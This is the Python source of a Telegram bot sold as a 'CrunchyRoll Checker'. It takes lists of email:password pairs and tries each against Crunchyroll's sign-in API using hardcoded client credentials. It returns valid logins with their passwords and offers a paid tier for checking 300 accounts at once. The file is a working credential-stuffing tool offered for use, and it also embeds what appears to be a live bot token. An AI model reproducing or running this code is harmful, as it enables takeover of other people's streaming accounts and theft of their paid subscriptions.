import os
import requests
import telebot
import time
import threading
from uuid import uuid1
from datetime import datetime, timedelta
from flask import Flask, request

bot = telebot.TeleBot('7308448311:AAF5MdrUTcN9FsZnOpBFHoiipDRcCutigYE')

authorized_users = set()  # Owner is automatically authorized
free_users = set()
user_limits = {}  # Tracks the limit of mchk for free users
hits_file = "CʀᴜɴᴄʜʏRᴏʟʟ_Hɪᴛs.txt"
cooldown = {}
cooldown_time = 30  # Free user cooldown in seconds
mchk_max_free = 3  # Free users can check up to 3 combinations per command
authorized_limit = 100  # Authorized users can check 300 combinations
owner_id = "5727462573"  # Replace with your own chat ID
total_users = 0

app = Flask(__name__)

@app.route('/' + bot.token, methods=['POST'])
def get_message():
    json_str = request.stream.read().decode('UTF-8')
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return '!', 200

@app.route("/", methods=['GET'])
def index():
    return "Bot is running!"
    
# Handler to display bot statistics
@bot.message_handler(commands=['stats'])
def stats(message):
    total_users = len(authorized_users) + len(free_users)
    bot.send_message(
        message.chat.id,
        f"📊 𝐁𝐨𝐭 𝐒𝐭𝐚𝐭𝐢𝐬𝐭𝐢𝐜𝐬:\n\n"
        f"👥 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: {total_users}\n"
        f"🔓 𝗙𝗿𝗲𝗲 𝗨𝘀𝗲𝗿𝘀: {len(free_users)}\n"
        f"🔒 𝗔𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲𝗱 𝗨𝘀𝗲𝗿𝘀: {len(authorized_users)}",
        disable_web_page_preview=True
    )

# Anti-spam cooldown for free users
def anti_spam(func):
    def wrapper(message):
        user_id = message.from_user.id
        current_time = time.time()

        if str(user_id) not in authorized_users:
            if user_id in cooldown and current_time - cooldown[user_id] < cooldown_time:
                bot.send_message(message.chat.id, f"Yᴏᴜ'ʀᴇ Oɴ Cᴏᴏʟᴅᴏᴡɴ! Tʀʏ Aɢᴀɪɴ Iɴ {int(cooldown_time - (current_time - cooldown[user_id]))} Sᴇᴄᴏɴᴅs.", disable_web_page_preview=True)
                return
            cooldown[user_id] = current_time

        return func(message)
    return wrapper

# Handle /start command
@bot.message_handler(commands=['start'])
def add_user(message):
    global total_users
    user_id = str(message.from_user.id)

    if user_id not in free_users and user_id not in authorized_users:
        free_users.add(user_id)
        total_users = len(free_users) + len(authorized_users)
        bot.send_message(message.chat.id, "Wᴇʟᴄᴏᴍᴇ! Yᴏᴜ Hᴀᴠᴇ Bᴇᴇɴ Aᴅᴅᴇᴅ ᴀs ᴀ Fʀᴇᴇ Usᴇʀ.", disable_web_page_preview=True)
    else:
        bot.send_message(message.chat.id, "Yᴏᴜ Aʀᴇ Aʟʀᴇᴀᴅʏ ʀᴇɢɪsᴛᴇʀᴇᴅ!", disable_web_page_preview=True)
        chat_id = message.chat.id
    gif_url = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjR3Y3JldDhodHBhdXg4bTZyd2k4Nmt6MnQxOWhrdDR2cnJtajN1YSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/B1Lopnwqs9WIr3GtnQ/giphy.gif"
    bot.send_animation(chat_id, gif_url, caption=(
        "🎉 <b>Wᴇʟᴄᴏᴍᴇ Tᴏ CʀᴜɴᴄʜʏRᴏʟʟ Cʜᴇᴄᴋᴇʀ</b> 🎉\n"
        "\n"
        "🔍 <b>Single Check:</b> Use <code>/chk email:pass</code> to check one account.\n"
        "🔄 <b>Multi-Check:</b> Use <code>/mchk</code> to check up to 3 accounts at once.\n"
        "\n"
        "💡 <b>Fʀᴇᴇ Pʟᴀɴ:</b> 10 /mchk checks/week, 3 accounts at a time, 30s cooldown.\n"
        "🚀 <b>Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ:</b> 300 accounts at once, no cooldown. DM @bhainkar for access.\n"
        "\n"
        "ℹ️ <b>Details:</b> Use /details to check your info"
        "\n"
        "<i>Enjoy fast and accurate checking with</i> <b>CʀᴜɴᴄʜʏRᴏʟʟ Cʜᴇᴄᴋᴇʀ</b>!"
        "\n\n"
        "Bᴏᴛ Bʏ @bhainkar"), parse_mode='HTML')


# Handle /chk for a single account
@bot.message_handler(commands=['chk'])
@anti_spam
def chk(message):
    user_id = str(message.from_user.id)
    current_time = time.time()

    try:
        email, pasw = message.text.split()[1].split(':')
        
        if not check_account_format(email, pasw):
            bot.send_message(message.chat.id, "Usᴇ /chk email:pass Tᴏ Sᴛᴀʀᴛ Cʜᴇᴄᴋɪɴɢ", disable_web_page_preview=True)
            return

        if user_id not in authorized_users:
            if user_id in cooldown and (current_time - cooldown[user_id] < cooldown_time):
                remaining_time = int(cooldown_time - current_time - cooldown[user_id])
                bot.send_message(message.chat.id, f"Yᴏᴜ'ʀᴇ Oɴ Cᴏᴏʟᴅᴏᴡɴ! Tʀʏ Aɢᴀɪɴ Iɴ {remaining_time} Sᴇᴄᴏɴᴅs.", disable_web_page_preview=True)
                return
            cooldown[user_id] = current_time

        bot.send_message(message.chat.id, "Processing...", disable_web_page_preview=True)
        result = check_crunchyroll_account(email, pasw, message)
        bot.send_message(message.chat.id, result, parse_mode='HTML', disable_web_page_preview=True)
        
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "Usᴇ /chk email:pass Tᴏ Sᴛᴀʀᴛ Cʜᴇᴄᴋɪɴɢ", disable_web_page_preview=True)
        
def check_account_format(email, pasw):
    # Check for the basic structure of email and password
    if "@" in email and len(pasw) > 0:
        return True
    return False
    
# Handle /mchk for multiple accounts
@bot.message_handler(commands=['mchk'])
@anti_spam
def mchk(message):
    user_id = str(message.from_user.id)

    try:
        accounts = message.text.split()[1:]
        if not accounts:
           bot.send_message(message.chat.id, "Usᴇ /mchk email:pass\n𝗡𝗢𝗧𝗘: Fʀᴇᴇ ᴜsᴇʀ ᴄᴀɴ ᴄʜᴇᴄᴋ ᴏɴʟʏ 3 ᴀᴄᴄ ᴀᴛ ᴀ ᴛɪᴍᴇ", disable_web_page_preview=True)
           return

        if len(accounts) > mchk_max_free and not is_authorized(user_id):
            bot.send_message(message.chat.id, f"Fʀᴇᴇ Usᴇʀs Cᴀɴ Cʜᴇᴄᴋ Uᴘ ᴛᴏ {mchk_max_free} Aᴄᴄᴏᴜɴᴛs Aᴛ A Tɪᴍᴇ.", disable_web_page_preview=True)
            return

        bot.send_message(message.chat.id, "Pʀᴏᴄᴇssɪɴɢ Mᴜʟᴛɪᴘʟᴇ Aᴄᴄᴏᴜɴᴛs...")

        for account in accounts:
            if ":" not in account:
                bot.send_message(message.chat.id, f"Iɴᴠᴀʟɪᴅ Fᴏʀᴍᴀᴛ: {account}", disable_web_page_preview=True)
                continue

            email, pasw = account.split(':')
            result = check_crunchyroll_account(email, pasw, message)
            bot.send_message(message.chat.id, result, parse_mode='HTML', disable_web_page_preview=True)

    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "Usᴇ /mchk email:pass [email:pass] (up to 3 for free users)", disable_web_page_preview=True)

# Check Crunchyroll account logic (you can replace this with your API check logic)
def check_crunchyroll_account(email, pasw, message):
    headers = {
        "ETP-Anonymous-ID": str(uuid1()),
        "Request-Type": "SignIn",
        "Accept": "application/json",
        "Accept-Charset": "UTF-8",
        "User-Agent": "Ktor client",
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Host": "beta-api.crunchyroll.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
    }
    data = {
        "grant_type": "password",
        "username": email,
        "password": pasw,
        "scope": "offline_access",
        "client_id": "yhukoj8on9w2pcpgjkn_",
        "client_secret": "q7gbr7aXk6HwW5sWfsKvdFwj7B1oK1wF",
        "device_type": "FIRETV",
        "device_id": str(uuid1()),
        "device_name": "kara"
    }

    try:
        res = requests.post("https://beta-api.crunchyroll.com/auth/v1/token", data=data, headers=headers)

        if "refresh_token" in res.text:
            token = res.json().get('access_token')
            headers_get = {
                "Authorization": f"Bearer {token}",
                "Accept": "application/json",
                "Accept-Charset": "UTF-8",
                "User-Agent": "Ktor client",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }

            res_get = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me", headers=headers_get)

            if "external_id" in res_get.text:
                # Get the user's first name and username to create a clickable profile link
                first_name = message.from_user.first_name
                username = message.from_user.username
                user_id = message.from_user.id

                # Create a clickable link to the user's profile
                plan_type = "Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ" if is_authorized(user_id) else "Fʀᴇᴇ Pʟᴀɴ"
                if username:
                    profile_link = f'<a href="https://t.me/{username}">{first_name}</a>'
                else:
                    profile_link = f'<a href="tg://user?id={user_id}">{first_name}</a>'

                return (f"<b>Cʀᴜɴᴄʜʏʀᴏʟʟ ᥫ᭡ Pʀᴇᴍɪᴜᴍ</b>\n\n<b>Eᴍᴀɪʟ</b> ✉️: <code>{email}</code>\n<b>Pᴀssᴡᴏʀᴅ</b> 🔑: <code>{pasw}</code>\n\n<b><i>Cʜᴇᴄᴋᴇᴅ ʙʏ</i></b> {profile_link}\n<b><i>Pʟᴀɴ: {plan_type}</i></b>\n<b>Bᴏᴛ ʙʏ</b> @bhainkar")
        elif "Pᴀssᴡᴏʀᴅ ɪs ɪɴᴄᴏʀʀᴇᴄᴛ" in res.text:
            return f"<blockquote expandable>❌ 𝗕𝗔𝗗: {email}:{pasw}</blockquote>"
        elif "Tᴏᴏ ᴍᴀɴʏ ᴀᴛᴛᴇᴍᴘᴛs" in res.text:
            return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Tᴏᴏ ᴍᴀɴʏ ᴀᴛᴛᴇᴍᴘᴛs. Tʀʏ ʟᴀᴛᴇʀ.</blockquote>"
        else:
            return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Uɴᴋɴᴏᴡɴ ᴇʀʀᴏʀ ᴏᴄᴄᴜʀʀᴇᴅ.</blockquote>"
    except requests.exceptions.RequestException as e:
        return f"<blockquote expandable>⚠️ 𝗖𝗨𝗦𝗧𝗢𝗠: {email} - Fᴀɪʟᴇᴅ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ.</blockquote>"


@bot.message_handler(commands=['broadcast'])
def broadcast(message):
    user_id = message.from_user.id
    if str(user_id) != owner_id:
        bot.send_message(message.chat.id, "Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ! Oɴʟʏ ᴛʜᴇ Oᴡɴᴇʀ Cᴀɴ Bʀᴏᴀᴅᴄᴀsᴛ Mᴇssᴀɢᴇs.", disable_web_page_preview=True)
        return

    try:
        # Get the message to broadcast from the command
        broadcast_message = " ".join(message.text.split()[1:])  # Join all parts after /broadcast

        if not broadcast_message:
            bot.send_message(message.chat.id, "Pʟᴇᴀsᴇ Pʀᴏᴠɪᴅᴇ A Mᴇssᴀɢᴇ Tᴏ Bʀᴏᴀᴅᴄᴀsᴛ.", disable_web_page_preview=True)
            return
        
        # Send the broadcast message to all users
        for user in authorized_users.union(free_users):
            try:
                bot.send_message(user, broadcast_message)
            except Exception as e:
                print(f"Failed to send message to {user}: {e}")  # Log the error

        bot.send_message(message.chat.id, "Bʀᴏᴀᴅᴄᴀsᴛ Mᴇssᴀɢᴇ Sᴇɴᴛ Tᴏ Aʟʟ Usᴇʀs!", disable_web_page_preview=True)

    except Exception as e:
        bot.send_message(message.chat.id, f"Sᴏᴍᴇᴛʜɪɴɢ Wᴇɴᴛ Wʀᴏɴɢ: {str(e)}", disable_web_page_preview=True)


        
# Command to check details of the user
@bot.message_handler(commands=['details'])
def details(message):
    user_id = str(message.from_user.id)
    username = message.from_user.username
    
    plan_type = "Bʜᴀɪɴᴋᴀʀ Pʟᴀɴ" if is_authorized(user_id) else "Fʀᴇᴇ Pʟᴀɴ"
    chat_id = message.chat.id
    gif_url = "https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExNWt0YWZyaHRrbG5xNzN4MTlkOWZmeDRyZ2ZjcmlwMjhlcnE1azVlNiZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/2FHr56vo08zbq8ac0C/giphy.gif"
    bot.send_animation(chat_id, gif_url, caption=f"𝗬𝗼𝘂𝗿 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n<b>Username:</b> @{username}\n<b>Chat ID:</b><code> {user_id}</code>\n<b>Plan:</b> {plan_type}\n\n<b>Bᴏᴛ ʙʏ</b> @bhainkar", parse_mode="HTML",)
    
# Command to authorize users (Owner only)
@bot.message_handler(commands=['add'])
def authorize_user(message):
    user_id = message.from_user.id

    # Only owner can authorize
    if str(user_id) != owner_id:
        bot.send_message(message.chat.id, "Unauthorized! Only the owner can authorize users.")
        return

    # Get the user ID to authorize
    try:
        user_to_authorize = str(message.text.split()[1])  # The user ID to authorize as a string
    except (IndexError, ValueError):
        bot.send_message(message.chat.id, "Please provide a valid user ID to authorize.")
        return

    # Check if the user is in the free users list
    if user_to_authorize in free_users:
        free_users.remove(user_to_authorize)
        authorized_users.add(user_to_authorize)
        bot.send_message(message.chat.id, f"User {user_to_authorize} has been authorized!")
    else:
        bot.send_message(message.chat.id, "User not found in free users list.")

        
@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = message.from_user.id

    # Only owner can remove users
    if str(user_id) != owner_id:
        bot.send_message(message.chat.id, "Uɴᴀᴜᴛʜᴏʀɪᴢᴇᴅ! Oɴʟʏ ᴛʜᴇ Oᴡɴᴇʀ Cᴀɴ Rᴇᴍᴏᴠᴇ Usᴇʀs.", disable_web_page_preview=True)
        return

    try:
        # Get the user ID to remove and convert it to a string
        remove_user_id = str(message.text.split()[1])

        # Check if user exists in the authorized or free user lists
        if remove_user_id in authorized_users:
            authorized_users.remove(remove_user_id)
            free_users.add(remove_user_id)  # Add back to free users
            bot.send_message(message.chat.id, f"𝗦ᴜᴄᴄᴇss! Rᴇᴍᴏᴠᴇᴅ Aᴜᴛʜᴏʀɪᴢᴇᴅ Usᴇʀ {remove_user_id}. Mᴏᴠᴇᴅ Tᴏ Fʀᴇᴇ Usᴇʀs.", disable_web_page_preview=True)
        
        elif remove_user_id in free_users:
            free_users.remove(remove_user_id)
            bot.send_message(message.chat.id, f"𝗦ᴜᴄᴄᴇss! Rᴇᴍᴏᴠᴇᴅ Fʀᴇᴇ Usᴇʀ {remove_user_id}.", disable_web_page_preview=True)

        else:
            bot.send_message(message.chat.id, f"Usᴇʀ {remove_user_id} ɴᴏᴛ ғᴏᴜɴᴅ ɪɴ ᴛʜᴇ ᴜsᴇʀ ʟɪsᴛs.", disable_web_page_preview=True)

        # Update statistics
        total_users = len(authorized_users) + len(free_users)
        
    except (ValueError, IndexError):
        bot.send_message(message.chat.id, "Usᴇ /remove <user_id> Tᴏ Rᴇᴍᴏᴠᴇ A Usᴇʀ.", disable_web_page_preview=True)


if __name__ == "__main__":
    bot.remove_webhook()
    bot.set_webhook(url="" + bot.token)  # Replace with your server URL
    app.run(host="0.0.0.0", port=5000)  # You can change the port number if needed

           
